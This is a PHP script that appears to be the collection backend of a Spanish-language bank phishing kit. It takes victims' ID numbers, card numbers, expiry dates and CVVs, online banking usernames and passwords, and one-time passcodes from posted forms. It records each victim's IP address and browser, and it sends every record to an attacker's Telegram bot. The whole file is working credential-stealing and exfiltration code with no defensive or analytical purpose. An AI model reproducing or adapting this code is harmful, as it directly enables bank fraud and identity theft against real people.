<?php
include 'telegram.php';

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$hash = $_POST['form'];
$user_ip = getUserIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if($hash == '1'){
    $msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
           "👤 *Cédula:* `".$_POST['cedula']."`\n".
           "🏦 *Banco:* ".$_POST["bank"]."\n".
           "💳 *Tarjeta:* ".$_POST['numbercard']."\n".
           "📅 *Expira:* ".$_POST["month"]."/".$_POST["year"]."\n".
           "🔐 *CVV:* ".$_POST["cvv"]."\n\n".
           "🌍 *IP:* `".$user_ip."`\n".
           "🖥 *User-Agent:* _".$user_agent."_" ;
}

if($hash == '2'){
    $msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
           "👤 *Cédula:* `".$_POST['cedula']."`\n".
           "👨‍💻 *Usuario:* ".$_POST["txt-usuario"]."\n".
           "🔑 *Contraseña:* ".$_POST['txt-password']."\n\n".
           "🌍 *IP:* `".$user_ip."`\n".
           "🖥 *User-Agent:* _".$user_agent."_" ;
}

if($hash == '3' || $hash == '4'){
    $msg = "🚨 *NUEVA GUIA ENTRANTE* 🚨\n\n".
           "👤 *Cédula:* `".$_POST['cedula']."`\n".
           "📲 *OTP:* ".$_POST["txt-otp-nuevo"]."\n\n".
           "🌍 *IP:* `".$user_ip."`\n".
           "🖥 *User-Agent:* _".$user_agent."_" ;
}

if (!empty($msg)) {
    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$telegram_admin_id."&parse_mode=Markdown&text=" . urlencode($msg));
}
?>
